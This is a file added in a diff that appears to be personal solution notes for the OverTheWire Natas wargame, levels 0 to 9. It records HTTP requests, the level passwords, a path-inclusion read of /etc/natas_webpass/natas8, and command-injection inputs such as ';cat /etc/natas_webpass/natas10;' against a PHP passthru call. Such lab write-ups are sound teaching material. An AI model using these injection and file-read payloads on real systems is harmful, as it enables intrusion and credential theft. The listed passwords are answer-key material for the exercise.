@@ -1,0 +1,281 @@
+0) http://natas0.natas.labs.overthewire.org
+
+Username: natas0
+Password: natas0
+
+see in code comment
+
+->
+
+natas1
+scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7
+
+1) http://natas1.natas.labs.overthewire.org
+
+https://mixedanalytics.com/tools/basic-authentication-generator/
+
+GET / HTTP/1.1
+Host: natas1.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMxOnNjZldHNnFORUlkenFWeWZSd0VHWHlOVWZGWmtaZVE3
+
+->
+
+natas2
+vsDOxoXyq3wckCP1ZmTZ71ngIA606odB
+
+2) http://natas2.natas.labs.overthewire.org
+
+GET / HTTP/1.1
+Host: natas1.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMyOnZzRE94b1h5cTN3Y2tDUDFabVRaNzFuZ0lBNjA2b2RC
+
+->
+
+There is nothing on this page
+<img src="files/pixel.png">
+
+---
+
+GET /files/ HTTP/1.1
+Host: natas2.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMyOnZzRE94b1h5cTN3Y2tDUDFabVRaNzFuZ0lBNjA2b2RC
+
+->
+
+users.txt
+
+---
+
+GET /files/users.txt HTTP/1.1
+Host: natas2.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMyOnZzRE94b1h5cTN3Y2tDUDFabVRaNzFuZ0lBNjA2b2RC
+
+->
+
+natas3
+K30JrSRHzjxq3paUQuwozY4MNvmNFyhI
+
+3) http://natas3.natas.labs.overthewire.org
+
+GET /robots.txt HTTP/1.1
+Host: natas3.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzOkszMEpyU1JIemp4cTNwYVVRdXdvelk0TU52bU5GeWhJ
+
+->
+
+Disallow: /s3cr3t/
+
+---
+
+GET /s3cr3t/ HTTP/1.1
+Host: natas3.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzOkszMEpyU1JIemp4cTNwYVVRdXdvelk0TU52bU5GeWhJ
+
+->
+
+users.txt
+
+---
+
+GET /s3cr3t/users.txt HTTP/1.1
+Host: natas3.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzOkszMEpyU1JIemp4cTNwYVVRdXdvelk0TU52bU5GeWhJ
+
+->
+
+natas4
+JDrPnuZAKyl6MkiqQGFIddrqpvgOASth
+
+4) http://natas4.natas.labs.overthewire.org/
+
+GET / HTTP/1.1
+Host: natas4.natas.labs.overthewire.org
+Authorization: Basic bmF0YXM0OkpEclBudVpBS3lsNk1raXFRR0ZJZGRycXB2Z09BU3Ro
+Referer: http://natas5.natas.labs.overthewire.org/
+
+->
+
+natas5
+e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
+
+5) http://natas5.natas.labs.overthewire.org
+
+GET / HTTP/1.1
+Host: natas5.natas.labs.overthewire.org
+Authorization: Basic bmF0YXM1OmU0ejJOb3kzb3F3UEpVV3pKSDBkc2VONjdDbjFzeTJN
+Cookie: loggedin=1
+
+->
+
+natas6
+7mhjtShJAcld2NYbKHEadnhEwRn2P8VT
+
+6) http://natas6.natas.labs.overthewire.org
+
+GET / HTTP/1.1
+Host: natas6.natas.labs.overthewire.org
+Authorization: Basic bmF0YXM2OjdtaGp0U2hKQWNsZDJOWWJLSEVhZG5oRXdSbjJQOFZU
+
+->
+
+<a href="index-source.html">
+
+---
+
+GET /index-source.html HTTP/1.1
+Host: natas6.natas.labs.overthewire.org
+Authorization: Basic bmF0YXM2OjdtaGp0U2hKQWNsZDJOWWJLSEVhZG5oRXdSbjJQOFZU
+
+->
+
+/includes/secret.inc
+
+---
+
+GET /includes/secret.inc HTTP/1.1
+Host: natas6.natas.labs.overthewire.org
+Authorization: Basic bmF0YXM2OjdtaGp0U2hKQWNsZDJOWWJLSEVhZG5oRXdSbjJQOFZU
+
+->
+
+<?
+$secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+
+---
+
+POST / HTTP/1.1
+Host: natas6.natas.labs.overthewire.org
+Authorization: Basic bmF0YXM2OjdtaGp0U2hKQWNsZDJOWWJLSEVhZG5oRXdSbjJQOFZU
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 90
+
+secret=FOEIUWGHFEEUHOFUOIU&submit=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C
+
+->
+
+natas7
+B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0
+
+7) http://natas7.natas.labs.overthewire.org
+
+GET / HTTP/1.1
+Host: natas7.natas.labs.overthewire.org
+Authorization: Basic bmF0YXM3OkIxc3pnOTVVY1Rucnp3bkYzaTNUellIbHlZaDhpQlYw
+
+->
+
+natas8 is in /etc/natas_webpass/natas8
+
+---
+
+GET /index.php?page=/etc/natas_webpass/natas8 HTTP/1.1
+Host: natas7.natas.labs.overthewire.org
+Authorization: Basic bmF0YXM3OkIxc3pnOTVVY1Rucnp3bkYzaTNUellIbHlZaDhpQlYw
+
+->
+
+natas8
+ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc
+
+8) http://natas8.natas.labs.overthewire.org
+
+GET / HTTP/1.1
+Host: natas8.natas.labs.overthewire.org
+Authorization: Basic bmF0YXM4OnVnWEw5NUtRbVVBSkpqNmJNZXpPbEJORHlJOUltd2tj
+
+->
+
+3d3d516343746d4d6d6c315669563362
+
+---
+
+https://www.dcode.fr/ascii-code
+https://www.dcode.fr/reverse-writing
+https://www.dcode.fr/base-64-encoding
+
+3d3d516343746d4d6d6c315669563362
+
+->
+
+==QcCtmMml1ViV3b
+
+->
+
+b3ViV1lmMmtCcQ==
+
+->
+
+oubWYf2kBq
+
+---
+
+POST / HTTP/1.1
+Host: natas8.natas.labs.overthewire.org
+Content-Length: 79
+Cache-Control: max-age=0
+Authorization: Basic bmF0YXM4OnVnWEw5NUtRbVVBSkpqNmJNZXpPbEJORHlJOUltd2tj
+Accept-Language: ru-RU,ru;q=0.9
+Origin: http://natas8.natas.labs.overthewire.org
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://natas8.natas.labs.overthewire.org/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+secret=oubWYf2kBq&submit=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C
+
+->
+
+natas9
+UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9
+
+9) http://natas9.natas.labs.overthewire.org
+
+GET /index-source.html HTTP/1.1
+Host: natas9.natas.labs.overthewire.org
+Authorization: Basic bmF0YXM5OlVkeG1JMjdkVGFYbW5kMXJ4S1FUZndzNmppaFRkY1E5
+
+->
+
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+
+---
+
+;ls -latr;
+
+->
+
+total 476
+drwxr-xr-x 38 root   root     4096 Jun 24 14:51 ..
+-rw-r-----  1 natas9 natas9    117 Jun 24 14:51 .htaccess
+-rw-r-----  1 natas9 natas9     45 Jun 24 14:51 .htpasswd
+-rw-r--r--  1 root   root     2924 Jun 24 14:52 index-source.html
+-rw-r-----  1 natas9 natas9   1185 Jun 24 14:52 index.php
+drwxr-x---  2 natas9 natas9   4096 Jun 24 14:52 .
+-rw-r-----  1 natas9 natas9 460878 Jun 24 14:52 dictionary.txt
+
+---
+
+http://natas9.natas.labs.overthewire.org/?needle=%3Bls+-latr%3B&submit=Search
+
+---
+
+;cat /etc/natas_webpass/natas10;
+
+->
+
+natas10
+EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
